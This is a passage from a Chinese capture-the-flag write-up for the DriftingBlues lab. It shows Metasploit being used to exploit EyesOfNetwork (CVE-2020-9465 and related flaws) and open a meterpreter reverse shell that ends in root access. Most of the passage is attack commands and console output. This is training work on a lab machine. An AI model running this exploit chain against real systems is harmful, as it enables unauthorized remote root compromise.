   RPORT        443              yes       The target port (TCP)
   SERVER_ADDR                   yes       EyesOfNetwork server IP address (if different from RHOST)
   SSL          true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI    /                yes       Base path to EyesOfNetwork
   URIPATH                       no        The URI to use for this exploit (default is random)
   VHOST                         no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to li
                                       sten on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux (x64)



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/eyesofnetwork_autodiscovery_rce) > set rhosts 172.20.10.6
rhosts => 172.20.10.6
msf6 exploit(linux/http/eyesofnetwork_autodiscovery_rce) > set lhost 172.20.10.8
lhost => 172.20.10.8
msf6 exploit(linux/http/eyesofnetwork_autodiscovery_rce) > exploit

[*] Started reverse TCP handler on 172.20.10.8:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Target is EyesOfNetwork 5.3 or older with API version 2.4.2.
[*] Target is EyesOfNetwork version 5.3 or later. Attempting exploitation using CVE-2020-8657 or CVE-2020-8656.
[*] Using generated API key: 593ab303a223a1a885c6f4be0e1eeb46145a248144a8d0318f315ba6d1d85c26
[-] Generated API key does not match.
[*] Using API key obtained via SQL injection: 593ab303a223a1a885c6f4be0e1eeb46145a248144a8d0318f315ba6d1d85c26
[-] Failed to obtain valid API key.
[*] Attempting exploitation using CVE-2020-9465.
[+] The target seems vulnerable.
[*] Verified that the admin user has at least one active session.
[*] Calculating the admin 'session_id' value. This will take a while...
[+] Obtained admin 'session_id' value: 358748692
[*] Command Stager progress - 100.00% done (897/897 bytes)
[*] Sending stage (3045380 bytes) to 172.20.10.6
[*] Meterpreter session 1 opened (172.20.10.8:4444 -> 172.20.10.6:33520) at 2024-04-12 06:08:35 -0400

meterpreter > cd /tmp
meterpreter > shell
Process 25767 created.
Channel 1 created.
whoami
root
script -c bash /dev/null
[root@driftingblues tmp]# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
[root@driftingblues tmp]# cd /root
[root@driftingblues ~]# ls
anaconda-ks.cfg  eon  index.htm  index_files  root.txt  upit.sh  user.txt
```

可以拿到shell，自此，完成打靶，前面的那个不行只代表我不行嗷，可能是哪里操作失误了，如果有师傅知道哪错了，可以告诉我一手！

